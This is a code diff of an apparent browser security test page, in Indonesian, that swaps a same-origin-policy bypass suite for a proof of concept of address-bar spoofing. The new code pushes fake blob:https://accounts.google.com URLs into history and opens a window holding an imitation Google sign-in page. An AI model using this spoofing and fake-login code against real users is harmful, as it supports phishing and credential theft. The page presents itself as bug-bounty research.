@@ -3,35 +3,31 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SOP Bypass Test Suite (Fixed)</title>
+<title>UI Spoofing PoC - Blob URL Address Bar</title>
 <style>
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1e1e1e; color: #d4d4d4; padding: 20px; margin: 0; }
-  h1 { color: #fff; border-bottom: 2px solid #333; padding-bottom: 10px; }
-  .panel { background: #2d2d2d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
-  button { padding: 10px 20px; background: #0e639c; color: #fff; border: none; border-radius: 4px; cursor: pointer; margin: 5px; font-size: 14px; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+  h1 { color: #fff; border-bottom: 2px solid #444; padding-bottom: 10px; }
+  .panel { background: #2d2d2d; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+  button { padding: 12px 24px; background: #0e639c; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; margin: 5px; }
   button:hover { background: #1177bb; }
-  button:disabled { background: #555; cursor: not-allowed; }
-  #log { background: #000; padding: 15px; border: 1px solid #444; border-radius: 4px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 12px; }
+  #log { background: #000; padding: 15px; border-radius: 6px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #333; }
   .success { color: #4caf50; font-weight: bold; }
   .error { color: #f44336; font-weight: bold; }
   .info { color: #2196f3; }
   .warn { color: #ff9800; }
-  #frameContainer { margin-top: 20px; }
-  iframe { width: 100%; height: 200px; border: 2px solid #555; background: #fff; border-radius: 4px; }
+  iframe { width: 100%; height: 200px; border: 2px solid #555; margin-top: 20px; border-radius: 6px; background: #fff; }
 </style>
 </head>
 <body>
 
-<h1>🔒 SOP Bypass Test Suite (Fixed)</h1>
+<h1>🕵️ UI Spoofing PoC — Blob URL & History Manipulation</h1>
 
 <div class="panel">
-  <p style="margin-top:0; color:#aaa;">Pilih metode pengujian di bawah ini. Setiap metode akan mencatat hasil di log.</p>
-  <button id="btn1">1. Iframe about:blank → Google</button>
-  <button id="btn2">2. Window.open about:blank → Google</button>
-  <button id="btn3">3. Iframe Sandbox (allow-same-origin)</button>
-  <button id="btn4">4. Blob URL → Google</button>
-  <button id="btn5">5. Iframe srcdoc → Google</button>
-  <button id="btn6">6. Data URL → Google</button>
+  <p style="color:#aaa; margin-top:0;">Pilih metode di bawah. Setiap metode akan mencoba memanipulasi address bar atau membuat window dengan URL yang terlihat tepercaya.</p>
+  <button id="btn1">1. History pushState (Blob Prefix)</button>
+  <button id="btn2">2. Window.open dengan Blob URL Palsu</button>
+  <button id="btn3">3. document.domain + Blob</button>
+  <button id="btn4">4. ReplaceState ke Google Blob</button>
   <button id="clear" style="background:#c62828;">Bersihkan Log</button>
 </div>
 
@@ -56,195 +52,179 @@
     console.log(msg);
   }
 
-  function clearLog() {
+  function clearAll() {
     logEl.textContent = '';
     frameContainer.innerHTML = '';
   }
 
   // ============================================
-  // UTILITY: Safe Access Check
-  // ============================================
-  function safeAccess(iframe, label) {
-    try {
-      const doc = iframe.contentDocument || iframe.contentWindow.document;
-      if (!doc) {
-        log(`${label}: ❌ contentDocument null (kemungkinan cross-origin)`, 'error');
-        return;
-      }
-      log(`${label}: ✅ Akses dokumen berhasil!`, 'success');
-      log(`${label}: Title = "${doc.title}"`, 'success');
-      log(`${label}: URL = ${doc.location ? doc.location.href : 'N/A'}`, 'success');
-    } catch (e) {
-      log(`${label}: ❌ Diblokir SOP: ${e.name} - ${e.message}`, 'error');
-    }
-  }
-
-  // ============================================
-  // METODE 1: Iframe about:blank → Google
+  // METODE 1: History pushState dengan prefix Blob
   // ============================================
   document.getElementById('btn1').onclick = () => {
-    log('=== METODE 1: Iframe about:blank → Google ===', 'info');
-    clearLog();
-    
-    const iframe = document.createElement('iframe');
-    iframe.src = 'about:blank';
-    iframe.style.display = 'block';
-    frameContainer.appendChild(iframe);
+    log('=== METODE 1: History pushState (Blob Prefix) ===', 'info');
+    clearAll();
 
-    setTimeout(() => {
-      log('Mengubah src ke https://www.google.com...', 'info');
-      iframe.src = 'https://www.google.com';
+    // URL yang ingin ditampilkan di address bar (terlihat seperti milik Google)
+    const fakeUrl = 'blob:https://accounts.google.com/1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d';
 
-      // Coba akses setelah 1 detik
-      setTimeout(() => {
-        safeAccess(iframe, 'Metode 1');
-      }, 1000);
-    }, 100);
+    try {
+      // Manipulasi history
+      history.pushState({ spoof: true }, 'Google Account', fakeUrl);
+      log('✅ pushState berhasil. Address bar seharusnya menampilkan:', 'success');
+      log('   ' + fakeUrl, 'success');
+      log('   (Cek address bar browser kamu sekarang)', 'info');
+
+      // Coba juga replaceState
+      history.replaceState({ spoof: true }, 'Google Account', fakeUrl);
+      log('✅ replaceState berhasil juga.', 'info');
+
+    } catch (e) {
+      log('❌ Gagal manipulasi history: ' + e.name + ' - ' + e.message, 'error');
+      log('   (Ini expected behavior di browser modern untuk origin lintas domain)', 'warn');
+    }
   };
 
   // ============================================
-  // METODE 2: Window.open about:blank → Google
+  // METODE 2: Window.open dengan Blob URL Palsu
   // ============================================
   document.getElementById('btn2').onclick = () => {
-    log('=== METODE 2: Window.open about:blank → Google ===', 'info');
-    
-    const win = window.open('about:blank', '_blank');
+    log('=== METODE 2: Window.open + Blob URL Palsu ===', 'info');
+
+    // Buat konten yang meniru halaman login Google
+    const fakeHtml = `
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta charset="UTF-8">
+        <title>Google Account</title>
+        <style>
+          body { font-family: 'Segoe UI', Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+          .card { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 400px; }
+          .logo { font-size: 48px; color: #4285f4; font-weight: bold; margin-bottom: 10px; }
+          h2 { color: #202124; margin-bottom: 20px; }
+          input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
+          button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+          .note { font-size: 12px; color: #999; margin-top: 20px; }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <div class="logo">G</div>
+          <h2>Google Account</h2>
+          <p style="color:#666; margin-bottom:20px;">Sign in to continue to Gmail</p>
+          <input type="email" placeholder="Email or phone" />
+          <button>Next</button>
+          <div class="note">This is a UI Spoofing PoC — not a real Google page</div>
+        </div>
+        <script>
+          // Manipulasi history di window baru
+          try {
+            history.replaceState({}, 'Google Account', 'blob:https://accounts.google.com/fake-uuid');
+          } catch(e) {}
+        <\/script>
+      </body>
+      </html>
+    `;
+
+    const blob = new Blob([fakeHtml], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+
+    log('Membuka window baru dengan Blob URL...', 'info');
+    log('Blob URL: ' + url, 'info');
+
+    const win = window.open(url, '_blank');
     if (!win) {
       log('❌ Popup diblokir. Izinkan popup untuk melanjutkan.', 'error');
       return;
     }
-    log('Window kosong dibuka.', 'info');
 
-    setTimeout(() => {
-      try {
-        win.location = 'https://www.google.com';
-        log('Navigasi ke Google dikirim.', 'info');
-      } catch (e) {
-        log('❌ Gagal navigasi: ' + e.message, 'error');
-      }
+    log('✅ Window dibuka. Perhatikan address bar:', 'success');
+    log('   - Browser modern akan menampilkan URL asli (blob:https://artha231.github.io/...)', 'info');
+    log('   - Jika address bar menampilkan "blob:https://accounts.google.com/...", itu BUG.', 'warn');
 
-      setTimeout(() => {
-        try {
-          const doc = win.document;
-          if (doc) {
-            log('Metode 2: ✅ Akses window.document berhasil!', 'success');
-            log('Metode 2: Title = "' + doc.title + '"', 'success');
-          } else {
-            log('Metode 2: ❌ Dokumen null.', 'error');
-          }
-        } catch (e) {
-          log('Metode 2: ❌ Diblokir SOP: ' + e.name + ' - ' + e.message, 'error');
-        }
-      }, 1000);
-    }, 100);
+    // Cleanup after 30s
+    setTimeout(() => URL.revokeObjectURL(url), 30000);
   };
 
   // ============================================
-  // METODE 3: Iframe Sandbox (allow-same-origin)
+  // METODE 3: document.domain + Blob
   // ============================================
   document.getElementById('btn3').onclick = () => {
-    log('=== METODE 3: Iframe Sandbox (allow-same-origin) ===', 'info');
-    clearLog();
+    log('=== METODE 3: document.domain + Blob ===', 'info');
 
+    try {
+      // Coba ubah document.domain (biasanya gagal di browser modern)
+      document.domain = 'google.com';
+      log('document.domain = "google.com" berhasil?', 'success');
+    } catch (e) {
+      log('❌ Gagal mengubah document.domain: ' + e.name + ' - ' + e.message, 'error');
+    }
+
+    // Buat iframe dengan origin palsu
     const iframe = document.createElement('iframe');
-    iframe.sandbox = 'allow-same-origin allow-scripts';
-    iframe.src = 'about:blank';
-    iframe.style.display = 'block';
+    iframe.srcdoc = `
+      <h2>Fake Google Frame</h2>
+      <p>Origin: <span id="o"></span></p>
+      <script>
+        document.getElementById('o').textContent = location.origin;
+        try {
+          document.domain = 'google.com';
+          parent.postMessage('domain_set', '*');
+        } catch(e) {
+          parent.postMessage('domain_fail: ' + e.message, '*');
+        }
+      <\/script>
+    `;
     frameContainer.appendChild(iframe);
 
-    // Isi about:blank dengan konten
-    setTimeout(() => {
-      try {
-        iframe.contentDocument.write('<h1 id="test">Blank Frame</h1><p>Loaded</p>');
-        iframe.contentDocument.close();
-        log('Konten ditulis ke about:blank.', 'info');
-      } catch (e) {
-        log('Gagal menulis ke about:blank: ' + e.message, 'error');
-      }
-    }, 100);
-
-    // Ubah ke Google
-    setTimeout(() => {
-      log('Mengubah src ke https://www.google.com...', 'info');
-      iframe.src = 'https://www.google.com';
-
-      setTimeout(() => {
-        safeAccess(iframe, 'Metode 3');
-      }, 1500);
-    }, 500);
+    window.addEventListener('message', (e) => {
+      log('Pesan dari iframe: ' + e.data, e.data === 'domain_set' ? 'success' : 'warn');
+    }, { once: true });
   };
 
   // ============================================
-  // METODE 4: Blob URL → Google
+  // METODE 4: ReplaceState ke Google Blob
   // ============================================
   document.getElementById('btn4').onclick = () => {
-    log('=== METODE 4: Blob URL → Google ===', 'info');
-    clearLog();
+    log('=== METODE 4: ReplaceState ke Google Blob ===', 'info');
 
-    const html = '<!DOCTYPE html><html><body><h1>Blob Frame</h1><script>window.location="https://www.google.com"<\/script></body></html>';
-    const blob = new Blob([html], { type: 'text/html' });
-    const url = URL.createObjectURL(blob);
+    const googleBlobUrl = 'blob:https://accounts.google.com/550e8400-e29b-41d4-a716-446655440000';
 
-    const iframe = document.createElement('iframe');
-    iframe.src = url;
-    iframe.style.display = 'block';
-    frameContainer.appendChild(iframe);
+    try {
+      history.replaceState(null, '', googleBlobUrl);
+      log('✅ replaceState berhasil. Address bar seharusnya menampilkan:', 'success');
+      log('   ' + googleBlobUrl, 'success');
+      log('   (Cek address bar — jika berubah, ini BUG!)', 'warn');
+    } catch (e) {
+      log('❌ Gagal replaceState: ' + e.name, 'error');
+      log('   Pesan: ' + e.message, 'error');
+    }
 
+    // Coba juga pushState dengan URL Blob dari origin berbeda
     setTimeout(() => {
-      safeAccess(iframe, 'Metode 4');
-      URL.revokeObjectURL(url);
-    }, 2000);
-  };
-
-  // ============================================
-  // METODE 5: Iframe srcdoc → Google
-  // ============================================
-  document.getElementById('btn5').onclick = () => {
-    log('=== METODE 5: Iframe srcdoc → Google ===', 'info');
-    clearLog();
-
-    const iframe = document.createElement('iframe');
-    iframe.srcdoc = '<!DOCTYPE html><html><body><h1>srcdoc Frame</h1><script>window.location="https://www.google.com"<\/script></body></html>';
-    iframe.style.display = 'block';
-    frameContainer.appendChild(iframe);
-
-    setTimeout(() => {
-      safeAccess(iframe, 'Metode 5');
-    }, 2000);
-  };
-
-  // ============================================
-  // METODE 6: Data URL → Google
-  // ============================================
-  document.getElementById('btn6').onclick = () => {
-    log('=== METODE 6: Data URL → Google ===', 'info');
-    clearLog();
-
-    const html = '<!DOCTYPE html><html><body><h1>Data URL Frame</h1><script>window.location="https://www.google.com"<\/script></body></html>';
-    const dataUrl = 'data:text/html;base64,' + btoa(unescape(encodeURIComponent(html)));
-
-    const iframe = document.createElement('iframe');
-    iframe.src = dataUrl;
-    iframe.style.display = 'block';
-    frameContainer.appendChild(iframe);
-
-    setTimeout(() => {
-      safeAccess(iframe, 'Metode 6');
-    }, 2000);
+      try {
+        history.pushState({}, '', 'blob:https://mail.google.com/fake');
+        log('pushState ke mail.google.com juga dicoba.', 'info');
+      } catch (e) {
+        log('❌ pushState juga gagal: ' + e.name, 'error');
+      }
+    }, 1000);
   };
 
   // ============================================
   // CLEAR LOG
   // ============================================
   document.getElementById('clear').onclick = () => {
-    clearLog();
+    clearAll();
     log('Log dibersihkan.', 'info');
   };
 
   // ============================================
   // INIT
   // ============================================
-  log('SOP Bypass Test Suite siap. Pilih metode di atas.', 'info');
+  log('UI Spoofing PoC siap. Pilih metode di atas.', 'info');
+  log('⚠️ PERINGATAN: Bug ini sudah DIPERBAIKI di browser modern.', 'warn');
+  log('   Gunakan hanya untuk edukasi bug bounty.', 'info');
 
 })();
 </script>
